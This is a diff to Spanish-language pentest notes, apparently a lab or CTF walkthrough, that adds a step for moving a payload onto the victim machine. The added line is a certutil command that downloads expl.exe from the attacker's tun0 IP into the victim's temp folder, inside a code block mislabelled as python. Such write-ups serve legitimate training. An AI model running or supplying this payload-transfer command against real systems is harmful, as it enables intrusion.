@@ -136,6 +136,8 @@ creamos un servidor para poder compartir el archivo
 
 ### transferencia de archivo
 subiremos el payload a la maquina victima usando el comando 
-````
+```python
+	certutil -urlcache -f http://<tun0 IP>:4245/expl.exe %temp%/expl.exe
 ```
+
 ![[Pasted image 20240307211011.png]]
